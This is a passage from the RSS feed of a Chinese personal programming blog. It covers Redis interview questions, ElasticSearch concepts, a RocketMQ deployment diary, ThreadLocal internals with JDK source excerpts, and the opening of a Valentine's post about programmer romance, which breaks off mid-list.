&lt;p&gt;这个问题可以从Redis的数据淘汰策略来考虑，如果需要保留热点数据，那么可以根据最近最少使用来淘汰数据，即LRU算法，这样剩下的就是热点数据了。&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Redis内存用完了会发生什么？&lt;/summary&gt;
&lt;p&gt;这个问题得看配置的Redis数据淘汰策略是什么，如果是默认的配置，Redis内存用完以后直接报错，可以根据自己的需求来设置数据淘汰策略，我一般都是使用的LRU来淘汰数据。&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Redis的分布式锁如何实现&lt;/summary&gt;
&lt;p&gt;Redis中提供了一个SETNX命令，即Set if Not Exists&lt;/p&gt;
&lt;p&gt;由于Redis是单线程的，所以使用该命令后，只能有一个客户端对某一个key设置值，在没有过期或删除该key之前，其他客户端是不能设置这个key的&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;那你是如何控制Redis实现分布式锁的有效时长呢？&lt;/summary&gt;
&lt;p&gt;采用Redis的SETNX命令确实不太好控制这个时长，但是可以采用Redis的一个框架，Redisson来实现。&lt;/p&gt;
&lt;p&gt;在Redisson中需要手动加锁，并且可以控制锁的失效时间和等待时间，当锁住的一个业务还没有执行完成时，Redisson的看门狗机制会每隔一段时间来检查当前业务是否还持有锁，如果持有锁，就增加锁的持久时间，当业务执行完成之后手动释放锁即可。&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Redis集群有哪些方案？&lt;/summary&gt;
&lt;p&gt;Redis提供的集群方案有三种：主从复制、哨兵模式、Redis分片集群&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;那你来介绍一下主从同步&lt;/summary&gt;
&lt;p&gt;单节点的Redis并发能力有限，要进一步提高Redis的并发能力，可以搭建主从集群，实现读写分离。一般都是一主多从，主节点负责写入数据，从节点负责读数据，主节点写入数据之后，需要将数据同步到从节点中。&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;那你继续说一下主从同步的流程吧&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;主从同步分为两个阶段，一个是全量同步，一个是增量同步&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;全量同步是指从节点第一次与主节点建立连接的时候&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;从节点请求主节点同步数据，从节点会携带自己的replication id和offset偏移量&lt;/li&gt;
&lt;li&gt;主节点判断是否是第一次请求，判断的依据是，主节点与从节点是否是同一个replication id，然后不是，那主节点就会把自己的replication id和offset发送给从节点，让主节点和从节点的信息保持一致&lt;/li&gt;
&lt;li&gt;与此同时，主节点会执行bgsave，生成RDB文件后，发送给从节点去执行，从节点先把自己的数据清空，然后执行主节点发来的RDB文件，这样就保持了一致。&lt;/li&gt;
&lt;li&gt;如果在从节点执行RDB文件的期间，仍有请求到了主节点，那么主节点会以命令的方式记录到缓冲区，缓冲区是一个日志文件，最后把这个日志文件发送给从节点，这样就保证了主节点和从节点数据完全一致，后期再进行同步数据的时候，都是依赖于这个日志文件。这个就是全量同步&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;增量同步是指，当从节点服务重启之后，数据不一致了，这个时候，从节点会请求主节点同步数据，主节点还是先判断是不是第一次请求，判断的语句还是replication id，不是第一次请求的话，就获取从节点的offset值，然后主节点从命令日志中获取offset值之后的数据，发送给从节点进行数据同步。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;怎么保证Redis的高并发高可用&lt;/summary&gt;
&lt;p&gt;首先可以搭建主从集群，再加上使用Redis中的哨兵模式，哨兵模式可以实现主从集群的自动故障恢复，里面就包含了对主从服务的监控、自动故障回复、通知；如果主节点故障，哨兵会将一个从节点提升为主节点，当故障实例恢复正常之后，也是以最新的主节点为主。同时哨兵也充当Redis客户端的服务发现来源，当集群发生故障转移的时候，会将最新消息推送给Redis客户端，所以一般项目都会采用哨兵模式来保证Redis的高并发高可用&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Redis是单线程的，为什么还那么快？&lt;/summary&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;首先Redis完全是基于内存的，内存的读写速度是非常快的，并且Redis是由C语言编写的&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;采用单线程，可以避免不必要的上下文切换的竞争条件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用I/O多路复用模型，非阻塞IO&lt;/p&gt;
&lt;p&gt;I/O多路复用指的是利用单个线程来监听多个socket，并在某个socket就绪的时候，得到通知，从而避免无效的等待，充分利用CPU资源。目前I/O多路复用都是采用的epoll模式实现，它会通知用户进程socket就绪的同时，把已就绪的socket写入用户空间，不需要挨个遍历socket来判断是否就绪。提升了性能。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Redis的网络模型使用I/O多路复用结合事件处理器来应对多个socket请求，例如，提供了连接应答处理器、命令回复处理器、命令请求处理器。&lt;/p&gt;
&lt;p&gt;Redis因为是基于内存的，内存读写速度非常快，所以性能瓶颈不在内存，而是在网络I/O，具体是在命令的解析这一块，假如很多的客户端都来读数据，那么他们都会携带自己的命令，Redis需要接收网络请求的数据，转化为Redis命令，那么Redis此时可能就忙不过来了。在Redis 6.0之后引入了多线程，用于解析网络请求。但是真正去执行命令的时候，还是使用的单线程。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/details&gt;</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/java/">JAVA</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/redis/">Redis</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>ElasticSearch</title>
                <link>https://xuoneyuan.github.io/posts/19/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/19/</guid>
                <pubDate>Tue, 23 Apr 2024 23:40:42 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;details&gt;
&lt;summary&gt;倒排索引&lt;/summary&gt;
&lt;p&gt;倒排索引也叫反向索引，我们通常理解的索引是通过key寻找value，与之相反，倒排索引是通过value寻找key，故而被称作反向索引。&lt;/p&gt;
&lt;p&gt;为了创建索引，ES引擎通过分词器将每个文档的内容拆成单独的词（称之为词条，或term），再将这些词条创建成不含重复词条的排序列表，然后列出每个词条出现在哪个文档。&lt;/p&gt;
&lt;p&gt;这种结构由文档中所有不重复的词的列表构成，对于其中每个词都有至少一个文档与与之关联。这种由属性值来确定记录的位置的结构就是倒排索引，带有倒排索引的文件被称为倒排文件。&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;底层 lucene&lt;/summary&gt;
简单来说，lucene 就是一个 jar 包，里面包含了封装好的各种建立倒排索引的算法代码。我们用 Java 开发的时候，引入 lucene jar，然后基于 lucene 的 api 去开发就可以了。
&lt;p&gt;通过 lucene，我们可以将已有的数据建立索引，lucene 会在本地磁盘上面，给我们组织索引的数据结构。&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;ES基本概念&lt;/summary&gt;
Index：索引，相当于关系数据库中的database概念，是一类数据的集合，是一个逻辑概念。
&lt;p&gt;Type：类型，相当于数据库中的table概念，在6.0版本之前，一个Index中可以有多个type，7.0版本后彻底废弃多type，每个索引只能有一个type，即“ _doc”。&lt;/p&gt;
&lt;p&gt;Document：文档，存储在ES中的主要实体叫文档，可以理解为关系型数据库中表的一行数据记录。每个文档由多个字段（field）组成。区别于关系型数据库的是，ES是一个非结构化的数据库，每个文档可以有不同的字段，并且有一个唯一标识。&lt;/p&gt;
&lt;p&gt;Field：字段，存在于文档中，字段是包含数据的键值对，可以理解为Mysql一行数据的其中一列。&lt;/p&gt;
&lt;p&gt;Mapping：映射，是对索引库中的索引字段及其数据类型进行定义，类似于关系型数据库中的表结构。ES默认动态创建索引和索引类型的Mapping。&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;ES集群概念&lt;/summary&gt;
cluster：集群，一个ES集群由多个节点（node）组成， 每个集群都有一个共同的集群名称最为标识。
&lt;p&gt;node：节点，一个ES实例即为一个节点，一台机器可以有多个节点。&lt;/p&gt;
&lt;p&gt;shard：分片，如果某个索引包含大量数据，以至于一台机器无法存储，ES可以将一个索引中的数据切分为多个shard，分布在多台服务器上存储。这样，ES就可以横向扩展，存储更多数据，让搜索和分析等操作分布到多台服务器上去执行，提升吞吐量和性能。每个shard都是一个最小工作单元，承载部分数据，具有一个lucene实例和完整的建立索引、处理请求的能力。&lt;/p&gt;
&lt;p&gt;replica：副本，就是shard的冗余备份，它可以防止数据丢失以及shard异常时负责容错和负载均衡。&lt;/p&gt;
&lt;/details&gt;</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/java/">JAVA</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/elasticsearch/">ElasticSearch</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>从阿里云到RocketMQ</title>
                <link>https://xuoneyuan.github.io/posts/18/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/18/</guid>
                <pubDate>Fri, 12 Apr 2024 15:08:49 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
&lt;p&gt;这几天闲来无事，突然想到自己还有一个云服务器，从去年双十一租来以后一直没怎么用，打开工作台，发现有一键部署幻兽帕鲁游戏的教程，兴冲冲地点进去，看到第二页就不想看了
&lt;img src=&#34;https://xuoneyuan.github.io/images/aliyun1.png&#34; alt=&#34;1&#34;&gt;
而我只有一台2核2G的入门级ECS云服务器
&lt;img src=&#34;https://xuoneyuan.github.io/images/aliyun2.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;Whatever，不管了，既然游戏服务器搭建不了，那就来搭建一个RocketMQ吧&lt;/p&gt;
&lt;h2 id=&#34;rocketmq&#34;&gt;RocketMQ&lt;/h2&gt;
&lt;h3 id=&#34;rocketmq的应用场景&#34;&gt;RocketMQ的应用场景&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;应用解耦&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;系统的耦合性越高，容错性就越低。以电商应用为例，用户创建订单后，如果耦合调用库存系统、物流系统、支付系统，任何一个子系统出了故障或者因为升级等原因暂时不可用，都会造成下单操作异常，影响用户使用体验。&lt;/p&gt;
&lt;p&gt;使用消息队列解耦合，系统的耦合性就会提高了。比如物流系统发生故障，需要几分钟才能来修复，在这段时间内，物流系统要处理的数据被缓存到消息队列中，用户的下单操作正常完成。当物流系统回复后，补充处理存在消息队列中的订单消息即可，终端系统感知不到物流系统发生过几分钟故障。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;流量削峰&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;应用系统如果遇到系统请求流量的瞬间猛增，有可能会将系统压垮。有了消息队列可以将大量请求缓存起来，分散到很长一段时间处理，这样可以大大提到系统的稳定性和用户体验。&lt;/p&gt;
&lt;p&gt;一般情况，为了保证系统的稳定性，如果系统负载超过阈值，就会阻止用户请求，这会影响用户体验，而如果使用消息队列将请求缓存起来，等待系统处理完毕后通知用户下单完毕，这样总不能下单体验要好。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;数据分发&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过消息队列可以让数据在多个系统更加之间进行流通。数据的产生方不需要关心谁来使用数据，只需要将数据发送到消息队列，数据使用方直接在消息队列中直接获取数据即可&lt;/p&gt;
&lt;h3 id=&#34;rocketmq架构&#34;&gt;RocketMQ架构&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/aliyun3.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;NameServer：我们可以同时部署很多台 NameServer 服务器，并且这些服务器是无状态的，节点之间无任何信息同步。
NameServer 起来后监听 端口，等待 Broker、Producer、Consumer 连上来，NameServer 是集群元数据管理中心。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Broker：Broker 启动，跟所有的 NameServer 保持长连接，每 30s 发送一次发送心跳包（像心跳一样持续稳定的发送请求）。心跳包中包含当前 Broker 信息 ( IP+ 端口等）以及存储所有 Topic 信息。注册成功后，NameServer 集群中就有 Topic 跟 Broker 的映射关系。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Topic：收发消息前，先创建 Topic，创建 Topic 时需要指定该 Topic 要存储在哪些 Broker 上，也可以在发送消息时自动创建 Topic。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Producer：Producer 发送消息，启动时先跟 NameServer 集群中的其中一台建立长连接，并从 NameServer 中获取当前发送的 Topic 存在哪些 Broker 上，采用轮询策略从选择一个队列，然后与队列所在的 Broker 建立长连接，并向 Broker 发消息。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Consumer：Consumer 跟 Producer 类似，跟其中一台 NameServer 建立长连接，获取当前订阅 Topic 存在哪些 Broker 上，然后直接跟 Broker 建立连接通道，开始消费消息。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Message Model&lt;br&gt;
&lt;strong&gt;集群消息&lt;/strong&gt;：一个 Topic 的一条消息，一个消费者组只能有一个消费者实例消费&lt;br&gt;
&lt;strong&gt;广播消息&lt;/strong&gt;：一个 Topic 的一条消息，一个消费者组所有消费者实例都会消费&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;rocketmq部署&#34;&gt;RocketMQ部署&lt;/h3&gt;
&lt;p&gt;在阿里云ECS服务器上部署RocketMQ的过程并不顺利，在多次试图打开NameServer无果并查阅资料后，我发现这似乎是由于内存问题，我的云服务器内存太小了，RocketMQ最低也要在4G内存环境下才能运行。但是在我打开vi修改runbroker.sh 和 runserver.sh修改默认JVM大小后，发现仍然不起作用。最终决定还是在Windows下配置。&lt;/p&gt;
&lt;p&gt;让我没想到的是Windows环境下依然报错。一直有关于RocketMQ_HOME或者是Java_HOME的错误提示。在多次试验后，发现只需要将runserver.cmd和runbroker.cmd文件中set &amp;quot;JAVA=%JAVA_HOME%\bin\java.exe&amp;quot;中的%JAVA_HOME%改成本地路径即可，并将上一行‘if not exist &amp;quot;%JAVA_HOME%\bin\java.exe&amp;quot; echo Please set the JAVA_HOME variable in your environment, We need java(x64)! &amp;amp; EXIT /B 1’删除&lt;/p&gt;
&lt;p&gt;启动 nameserver命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;start mqnamesrv.cmd
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/aliyun4.png&#34; alt=&#34;1&#34;&gt;
启动 broker命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;start mqbroker.cmd -n 127.0.0.1:9876 autoCreateTopicEnable=true
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/aliyun5.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;安装控制台，可以在本地用maven手动打包，也可以用docker，dockerfile已经写好了，我用了最省事的方法，在本地windows的cmd命令窗口，通过cd进入到源码解压目录下的rocketmq-console中，执行maven打包命令并跳过test：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mvn clean package -Dmaven.test.skip=true
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在自定义修改application.yml文件的port后，dashboard打开了
&lt;img src=&#34;https://xuoneyuan.github.io/images/aliyun6.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/java/">JAVA</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E9%98%BF%E9%87%8C%E4%BA%91/">阿里云</category>
                                
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/rocketmq/">RocketMQ</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>ThreadLocal</title>
                <link>https://xuoneyuan.github.io/posts/16/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/16/</guid>
                <pubDate>Fri, 29 Mar 2024 16:55:01 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;h3 id=&#34;什么是threadlocal&#34;&gt;什么是ThreadLocal？&lt;/h3&gt;
&lt;p&gt;ThreadLocal叫做线程变量，意思是ThreadLocal中填充的变量属于当前线程，该变量对其他线程而言是隔离的，也就是说该变量是当前线程独有的变量。
&lt;img src=&#34;https://xuoneyuan.github.io/images/tl1.png&#34; alt=&#34;1&#34;&gt;
ThreadLocal为变量在每个线程中都创建了一个副本，那么每个线程可以访问自己内部的副本变量。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;因为每个 Thread 内有自己的实例副本，且该副本只能由当前 Thread 使用。这是也是 ThreadLocal 命名的由来。&lt;/li&gt;
&lt;li&gt;既然每个 Thread 有自己的实例副本，且其它 Thread 不可访问，那就不存在多线程间共享的问题。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ThreadLocal 提供了线程本地的实例。它其实是一种线程的隔离机制，保障了多线程环境下对于共享变量访问的安全性。&lt;/p&gt;
&lt;h3 id=&#34;threadlocal与synchronized的区别&#34;&gt;ThreadLocal与Synchronized的区别&lt;/h3&gt;
&lt;p&gt;ThreadLocal和Synchonized都用于解决多线程并发访问。
&lt;img src=&#34;https://xuoneyuan.github.io/images/tl2.png&#34; alt=&#34;1&#34;&gt;
ThreadLocal与synchronized有本质的区别：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Synchronized用于线程间的数据共享，而ThreadLocal则用于线程间的数据隔离。&lt;/li&gt;
&lt;li&gt;Synchronized是利用锁的机制，使变量或代码块在某一时该只能被一个线程访问。而ThreadLocal为每一个线程都提供了变量的副本
，使得每个线程在某一时间访问到的并不是同一个对象，这样就隔离了多个线程对数据的数据共享。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;theadlocal使用场景&#34;&gt;TheadLocal使用场景&lt;/h3&gt;
&lt;p&gt;场景一：代替参数的显式传递&lt;/p&gt;
&lt;p&gt;当我们在写API接口的时候，通常Controller层会接受来自前端的入参，当这个接口功能比较复杂的时候，可能我们调用的Service层内部还调用了 很多其他的很多方法，通常情况下，我们会在每个调用的方法上加上需要传递的参数。&lt;/p&gt;
&lt;p&gt;但是如果我们将参数存入ThreadLocal中，那么就不用显式的传递参数了，而是只需要ThreadLocal中获取即可。&lt;/p&gt;
&lt;p&gt;场景二：全局存储用户信息&lt;/p&gt;
&lt;p&gt;在现在的系统设计中，前后端分离已基本成为常态，分离之后如何获取用户信息就成了一件麻烦事，通常在用户登录后， 用户信息会保存在Session或者Token中。这个时候，我们如果使用常规的手段去获取用户信息会很费劲，拿Session来说，我们要在接口参数中加上HttpServletRequest对象，然后调用 getSession方法，且每一个需要用户信息的接口都要加上这个参数，才能获取Session，这样实现就很麻烦了。&lt;/p&gt;
&lt;p&gt;在实际的系统设计中，我们肯定不会采用上面所说的这种方式，而是使用ThreadLocal，我们会选择在拦截器的业务中， 获取到保存的用户信息，然后存入ThreadLocal，那么当前线程在任何地方如果需要拿到用户信息都可以使用ThreadLocal的get()方法 (异步程序中ThreadLocal是不可靠的)&lt;/p&gt;
&lt;p&gt;场景三：解决线程安全问题&lt;/p&gt;
&lt;p&gt;在Spring的Web项目中，我们通常会将业务分为Controller层，Service层，Dao层， 我们都知道@Autowired注解默认使用单例模式，那么不同请求线程进来之后，由于Dao层使用单例，那么负责数据库连接的Connection也只有一个， 如果每个请求线程都去连接数据库，那么就会造成线程不安全的问题，Spring是如何解决这个问题的呢？&lt;/p&gt;
&lt;p&gt;在Spring项目中Dao层中装配的Connection肯定是线程安全的，其解决方案就是采用ThreadLocal方法，当每个请求线程使用Connection的时候， 都会从ThreadLocal获取一次，如果为null，说明没有进行过数据库连接，连接后存入ThreadLocal中，如此一来，每一个请求线程都保存有一份 自己的Connection。于是便解决了线程安全问题&lt;/p&gt;
&lt;h3 id=&#34;threadlocal原理&#34;&gt;ThreadLocal原理&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/tl3.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;图中有两个线程Thread1以及Thread2。&lt;/li&gt;
&lt;li&gt;Thread类中有一个叫做threadLocals的成员变量，它是ThreadLocal.ThreadLocalMap类型的。&lt;/li&gt;
&lt;li&gt;ThreadLocalMap内部维护了Entry数组，每个Entry代表一个完整的对象，key是ThreadLocal本身，value是ThreadLocal的泛型对象值。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;set&#34;&gt;set&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; public void set(T value) {
        //1、获取当前线程
        Thread t = Thread.currentThread();
        //2、获取线程中的属性 threadLocalMap ,如果threadLocalMap 不为空，
        //则直接更新要保存的变量值，否则创建threadLocalMap，并赋值
        ThreadLocalMap map = getMap(t);
        if (map != null)
            map.set(this, value);
        else
            // 初始化thradLocalMap 并赋值
            createMap(t, value);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ThreadLocal set赋值的时候首先会获取当前线程thread,并获取thread线程中的ThreadLocalMap属性。如果map属性不为空，则直接更新value值，如果map为空，则实例化threadLocalMap,并将value值初始化。&lt;/p&gt;
&lt;h4 id=&#34;threadlocalmap&#34;&gt;ThreadLocalMap&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  static class ThreadLocalMap {
 
        /**
         * The entries in this hash map extend WeakReference, using
         * its main ref field as the key (which is always a
         * ThreadLocal object).  Note that null keys (i.e. entry.get()
         * == null) mean that the key is no longer referenced, so the
         * entry can be expunged from table.  Such entries are referred to
         * as &amp;#34;stale entries&amp;#34; in the code that follows.
         */
        static class Entry extends WeakReference&amp;lt;ThreadLocal&amp;lt;?&amp;gt;&amp;gt; {
            /** The value associated with this ThreadLocal. */
            Object value;
 
            Entry(ThreadLocal&amp;lt;?&amp;gt; k, Object v) {
                super(k);
                value = v;
            }
        }   
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ThreadLocalMap是ThreadLocal的内部静态类，而它的构成主要是用Entry来保存数据 ，而且还是继承的弱引用。在Entry内部使用ThreadLocal作为key，使用我们设置的value作为value。&lt;/p&gt;
&lt;h4 id=&#34;get&#34;&gt;get&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    public T get() {
        //1、获取当前线程
        Thread t = Thread.currentThread();
        //2、获取当前线程的ThreadLocalMap
        ThreadLocalMap map = getMap(t);
        //3、如果map数据不为空，
        if (map != null) {
            //3.1、获取threalLocalMap中存储的值
            ThreadLocalMap.Entry e = map.getEntry(this);
            if (e != null) {
                @SuppressWarnings(&amp;#34;unchecked&amp;#34;)
                T result = (T)e.value;
                return result;
            }
        }
        //如果是数据为null，则初始化，初始化的结果，TheralLocalMap中存放key值为threadLocal，值为null
        return setInitialValue();
    }
 
 
private T setInitialValue() {
        T value = initialValue();
        Thread t = Thread.currentThread();
        ThreadLocalMap map = getMap(t);
        if (map != null)
            map.set(this, value);
        else
            createMap(t, value);
        return value;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过 ThreadLocalMap 获取当前线程的存储的 Value 值&lt;/p&gt;
&lt;p&gt;设置 ThreadLocal 的初始化值，未 set(T value) 初次获取 Thread 对应的 Value 值时会调用，即被 setInitialValue 方法调用。需要重写该方法。&lt;/p&gt;
&lt;h4 id=&#34;remove&#34;&gt;remove&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; public void remove() {
         ThreadLocalMap m = getMap(Thread.currentThread());
         if (m != null)
             m.remove(this);
     }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;remove方法，直接将ThrealLocal 对应的值从当前相差Thread中的ThreadLocalMap中删除。&lt;/p&gt;
&lt;h4 id=&#34;总结&#34;&gt;总结&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Thread线程类有一个类型为ThreadLocal.ThreadLocalMap的变量threadLocals，即每个线程都有一个属于自己的ThreadLocalMap。&lt;/li&gt;
&lt;li&gt;ThreadLocalMap方法内部维护者Entry数组，其中key是ThreadLocal本身，而value则为其泛型值。&lt;/li&gt;
&lt;li&gt;并发场景下，每个线程都会存储当前变量副本到自己的ThreadLocalMap中，后续这个线程对于共享变量的操作，都是从TheadLocalMap里进行变更，不会影响全局共享变量的值。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;内存泄漏&#34;&gt;内存泄漏&lt;/h3&gt;
&lt;h4 id=&#34;原因&#34;&gt;原因&lt;/h4&gt;
&lt;p&gt;目前程序运行大多采用的是线程池模式，线程存在时间很长，如果不断往其中加入线程私有对象而得不到回收，会导致OOM。所以为了减少程序员手动回收，同时兼顾避免OOM，设计了一套弱引用自动回收机制。&lt;/p&gt;
&lt;p&gt;由于threadLocal对象是弱引用，如果外部没有强引用指向的话，它就会被GC回收，那么这个时候导致Entry的key就为NULL，如果此时value外部也没有强引用指向的话，那么这个value就永远无法访问了，按道理也该被回收。但是由于entry还在强引用value，那么此时value就无法被回收，此时内存泄漏就出现了。本质原因是因为value成为了一个永远无法被访问也无法被回收的对象。
&lt;img src=&#34;https://xuoneyuan.github.io/images/tl4.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;避免方法&#34;&gt;避免方法&lt;/h4&gt;
&lt;p&gt;每次使用完毕之后记得调用一下remove()方法清除数据。
ThreadLocal变量尽量定义成static final类型，避免频繁创建ThreadLocal实例。这样可以保证程序中一直存在ThreadLocal强引用，也能保证任何时候都能通过ThreadLocal的弱引用访问Entry的value值，从而进行清除。&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/java/">JAVA</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/java/">JAVA</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>快来欣赏程序员的浪漫！——情人节特辑</title>
                <link>https://xuoneyuan.github.io/posts/15/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/15/</guid>
                <pubDate>Sat, 17 Feb 2024 11:09:30 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;p&gt;大众对于程序员这个群体的印象似乎就是刻板、认真、不善言辞，事实也是如此，但这并不代表程序员们不懂得什么叫爱情，下面就是本人收集的部分专属于程序员或者说计算机从业者的浪漫~&lt;/p&gt;
&lt;h3 id=&#34;part-1&#34;&gt;PART 1&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zhihu.com/question/630876166&#34;&gt;男朋友这几天发来的代码，看不太懂，求解读?&lt;/a&gt;
&lt;img src=&#34;https://xuoneyuan.github.io/images/npy1.png&#34; alt=&#34;1&#34;&gt;
&lt;img src=&#34;https://xuoneyuan.github.io/images/npy2.png&#34; alt=&#34;1&#34;&gt;
&lt;img src=&#34;https://xuoneyuan.github.io/images/npy3.png&#34; alt=&#34;1&#34;&gt;
&lt;img src=&#34;https://xuoneyuan.github.io/images/npy4.png&#34; alt=&#34;1&#34;&gt;
这个是知乎上的一个提问，由于本人c++水平不够高，下面的代码解释都是知乎回答或者GPT4的理解&lt;/p&gt;
&lt;h4 id=&#34;gpt回答&#34;&gt;GPT回答&lt;/h4&gt;
&lt;h5 id=&#34;第一段代码&#34;&gt;第一段代码&lt;/h5&gt;
&lt;p&gt;在这段代码中，有三个类：People、Jxl和Xp。Jxl继承自People，Xp也继承自People。在Xp类中，定义了两个方法：构造函数和析构函数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;构造函数 Xp():&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使当前线程休眠24年（这显然是一个比喻，实际代码中这样做没有意义，因为它会阻塞程序那么长时间）。&lt;/li&gt;
